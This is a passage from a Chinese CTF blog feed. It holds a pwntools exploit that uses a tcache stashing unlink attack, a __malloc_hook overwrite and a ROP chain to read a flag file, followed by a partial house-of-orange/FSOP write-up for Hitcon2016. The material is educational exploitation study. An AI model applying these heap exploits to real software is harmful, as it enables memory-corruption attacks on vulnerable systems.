name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">retire</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">s</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">0xc388</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">        retire(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap base</span></span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    heap_base = u64(io.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &amp; (~<span class="number">0xfff</span>)</span><br><span class="line">    pf(<span class="string">&quot;heap base&quot;</span>, heap_base)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc base</span></span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    libc_base = u64(io.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3B3CA0</span></span><br><span class="line">    pf(<span class="string">&quot;libc base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache stashing unlink attack</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">        retire(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">        retire(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b *$rebase(0x16AB)&quot;)</span></span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">    rename(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x308</span> + p64(<span class="number">0x101</span>) + p64(heap_base+<span class="number">0x2d20</span>) + p64(heap_base+<span class="number">0x1f</span>))</span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">0xf8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    debut(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x217</span>)</span><br><span class="line">    debut(<span class="number">1</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x217</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">    retire(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    rename(<span class="number">1</span>, p64(libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]))</span><br><span class="line">    backdoor(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    backdoor(p64(libc_base+<span class="number">0xbdfd1</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># rop</span></span><br><span class="line">    poprdi = libc_base + <span class="number">0x219c0</span></span><br><span class="line">    poprsi = libc_base + <span class="number">0x24435</span></span><br><span class="line">    poprdx = libc_base + <span class="number">0x1b9a</span></span><br><span class="line">    poprax = libc_base + <span class="number">0x37fa8</span></span><br><span class="line">    syscall= libc_base + g(<span class="string">&quot;syscall; ret&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## open</span></span><br><span class="line">    rops  = p64(poprdi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">    rops += p64(poprsi) + p64(<span class="number">0</span>)</span><br><span class="line">    rops += p64(poprdx) + p64(<span class="number">0</span>)</span><br><span class="line">    rops += p64(poprax) + p64(<span class="number">2</span>)</span><br><span class="line">    rops += p64(syscall)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## read</span></span><br><span class="line">    rops += p64(poprdi) + p64(<span class="number">3</span>)</span><br><span class="line">    rops += p64(poprsi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">    rops += p64(poprdx) + p64(<span class="number">20</span>)</span><br><span class="line">    rops += p64(poprax) + p64(<span class="number">0</span>)</span><br><span class="line">    rops += p64(syscall)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## write</span></span><br><span class="line">    rops += p64(poprdi) + p64(<span class="number">1</span>)</span><br><span class="line">    rops += p64(poprsi) + p64(heap_base+<span class="number">0x2d30</span>)</span><br><span class="line">    rops += p64(poprdx) + p64(<span class="number">20</span>)</span><br><span class="line">    rops += p64(poprax) + p64(<span class="number">1</span>)</span><br><span class="line">    rops += p64(syscall)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;&quot;&quot;b *$rebase(0x16AB)</span></span><br><span class="line">    <span class="comment"># b *$rebase(0x139C)</span></span><br><span class="line">    <span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line"></span><br><span class="line">    debut(<span class="number">0</span>, rops.ljust(<span class="number">0x80</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    io.interactive(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x00000000000bdfd1 : add rsp, 0x48 ; ret</span></span><br><span class="line"><span class="string">0x00000000000219c0 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000024435 : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x0000000000001b9a : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x0000000000037fa8 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x000000000000275b : syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li>how2heap tcache_stashing_unlink_attack.c</li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-4-hitcon-2019-one_punch_man">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-4-hitcon-2019-one_punch_man</a></li><li><a href="https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus">https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;tcache-stashing-unlink-attack&quot;&gt;&lt;a href=&quot;#tcache-stashing-unlink-attack&quot; class=&quot;headerlink&quot; title=&quot;tcache stashing unlink attack&quot;&gt;&lt;/a&gt;tcache stashing unlink attack&lt;/h2&gt;&lt;p&gt;在tcache中布置5个chunk，对应大小的small bin中布置2个chunk。修改倒数第二个small chunk的bk指向target，target-&amp;gt;bk写入一个可写的位置。使用calloc触发，因为calloc调用&lt;code&gt;_int_malloc&lt;/code&gt;不会使用tcache进行分配（除了&lt;code&gt;_int_malloc&lt;/code&gt;遍历unsorted bin的尾部），只会往tcache中填充。&lt;/p&gt;
&lt;p&gt;可以造成target-&amp;gt;bk-&amp;gt;fd位置写入大数字，并且target成为tcache中第一个，再次malloc就可以获得。&lt;/p&gt;
&lt;p&gt;有点像fastbin reverse into tcache。&lt;/p&gt;
&lt;h3 id=&quot;variation&quot;&gt;&lt;a href=&quot;#variation&quot; class=&quot;headerlink&quot; title=&quot;variation&quot;&gt;&lt;/a&gt;variation&lt;/h3&gt;&lt;p&gt;在tcache中布置6个chunk，对应大小的small bin中布置2个chunk。（可以用unsorted bin切割的方式布置2个small bin）&lt;/p&gt;
&lt;p&gt;修改倒数第二个small chunk的bk，calloc触发，只在bk-&amp;gt;fd写入大数字。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--house_of_orange Hitcon2016--houseoforange</title>
    <link href="http://hhdx.xyz/2020/07/25/How2heap-house-of-orange-Hitcon2016-houseoforange/"/>
    <id>http://hhdx.xyz/2020/07/25/How2heap-house-of-orange-Hitcon2016-houseoforange/</id>
    <published>2020-07-25T10:14:07.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>修改<code>topchunk-&gt;size</code>为一个缩小的并且满足页对齐的大小，malloc一个大于size的块（但也不要大于mmap threshold），会导致原来topchunk被放入unsorted bin。</p><p>当topchunk不足以分配所需空间时，会调用sysmalloc分配额外空间。一般情况下，main_arena中old top chunk和新分配的top chunk首尾相邻，从而会进行合并。当我们将<code>topchunk-&gt;size</code>减小后，会检测不到相邻，也就不会合并了。设置好fencepost chunk，会执行<code>_int_free (av, old_top, 1)</code>将其放入unsorted bin。</p><p>代码涉及<code>_int_malloc</code>后边和<code>sysmalloc</code>。</p><a id="more"></a><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><details>    <summary>`struct _IO_FILE_plus`结构</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></details>`struct _IO_FILE_plus`包含`struct _IO_FILE`和`struct _IO_jump_t *`，前者保存打开文件的信息，后者保存对文件进行操作的函数指针列表的指针，可以对不同类型的文件加以不同的具体操作。<details>    <summary>`struct _IO_FILE`结构</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></details><details>    <summary>`struct _IO_jump_t`结构</summary>​```cstruct _IO_jump_t{    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);#if 0    get_column;    set_column;#endif};<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;details&gt;</span><br><span class="line">FSOP是File Stream Oriented Programming的缩写，核心就是改写&#96;_IO_list_all&#96;的值，伪造&#96;struct _IO_FILE_plus&#96;结构，对控制流进行劫持。&#96;_IO_list_all&#96;是glibc中的一个全局变量，是一个&#96;struct _IO_FILE_plus&#96;的指针，默认情况下指向stderr-&gt;-&gt;stdout-&gt;stdin。标准输入、标准输出、标准错误输出都是&#96;struct _IO_FILE&#96;类型，都被包含在于&#96;struct _IO_FILE_plus&#96;结构中，使用&#96;struct _IO_FILE&#96;中的chain变量连接。</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;c</span><br><span class="line">extern struct _IO_FILE_plus _IO_2_1_stdin_;</span><br><span class="line">extern struct _IO_FILE_plus _IO_2_1_stdout_;</span><br><span class="line">extern struct _IO_FILE_plus _IO_2_1_stderr_;</span><br><span class="line"></span><br><span class="line">#define _IO_stdin ((_IO_FILE*)(&amp;_IO_2_1_stdin_))</span><br><span class="line">#define _IO_stdout ((_IO_FILE*)(&amp;_IO_2_1_stdout_))</span><br><span class="line">#define _IO_stderr ((_IO_FILE*)(&amp;_IO_2_1_stderr_))</span><br></pre></td></tr></table></figure>在堆中可以使用`malloc_printerr`触发劫持。下图为对`malloc_printerr`中一系列的函数调用关系，最终在`_IO_flush_all_lockp`中会对链表中每一个文件进行刷新，满足条件的情况下，调用每个文件的`_IO_OVERFLOW`函数。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/abort_routine.001.jpeg"></p><h2 id="Hitcon2016-houseoforange"><a href="#Hitcon2016-houseoforange" class="headerlink" title="Hitcon2016 houseoforange"></a>Hitcon2016 houseoforange</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>关键数据结构</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200725225408295.png" alt="image-20200725225408295"></p><p>功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. Build the house                  </span><br><span class="line">2. See the house                    </span><br><span class="line">3. Upgrade the house                </span><br><span class="line">4. Give up</span><br></pre></td></tr></table></figure><p>Build：输入名称长度size，依次经过malloc(0x10)、malloc(size)、calloc(0x8)，然后读入名称等。</p><p>See：输出名称等。</p><p>Upgrade：对名称进行修改，可以输入任意长度字符，也就是堆上任意长度的溢出。</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>使用house of orange使得old top chunk进入unsorted bin。分配large size的块，泄露libc base和heap addr。</p><p>使用unsorted bin attack修改<code>_IO_list_all</code>，攻击后它将指向unsorted bin在main_arena中的头结点。unsorted bin attack的同时，在同一个chunk上伪造 <code>struct _IO_FILE_plus</code>结构。修改该<code>chunk-&gt;size</code>为0x61使其落入small bin(0x60)也就是unsorted bin头结点地址+0x68（相当于修改<code>struct _IO_FILE</code>中chain）。</p><h3 id="house-of-orange-1"><a href="#house-of-orange-1" class="headerlink" title="house of orange"></a>house of orange</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="number">0x200</span> - <span class="number">0x20</span> - <span class="number">0x20</span> - <span class="number">0x10</span>, <span class="string">&quot;A&quot;</span>)  <span class="comment"># 在top chunk总共分配0x200</span></span><br><span class="line">upgrade(<span class="number">0x1b0</span>+<span class="number">0x20</span>+<span class="number">0x10</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x1d8</span> + p64(<span class="number">0xe01</span>)) <span class="comment"># 覆盖topchunk-&gt;size为0xe01</span></span><br><span class="line">build(<span class="number">0x1000</span>, <span class="string">&quot;A&quot;</span>)                      <span class="comment"># 分配一个大于0xe00的块，触发house of orange</span></span><br></pre></td></tr></table></figure><h3 id="leak-libc-and-heap"><a href="#leak-libc-and-heap" class="headerlink" title="leak libc and heap"></a>leak libc and heap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc base </span></span><br><span class="line">build(<span class="number">0x400</span>, <span class="string">&quot;A&quot;</span>*<span class="number">8</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">libc_addr = u64(io.recvline()[<span class="number">8</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">pf(<span class="string">&quot;libc base&quot;</span>, libc_addr)</span><br><span class="line">libc_base = libc_addr - <span class="number">0x3C5178</span></span><br><span class="line">libc_base = libc_addr - <span class="number">0x39C178</span></span><br><span class="line">pf(<span class="string">&quot;libc base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap 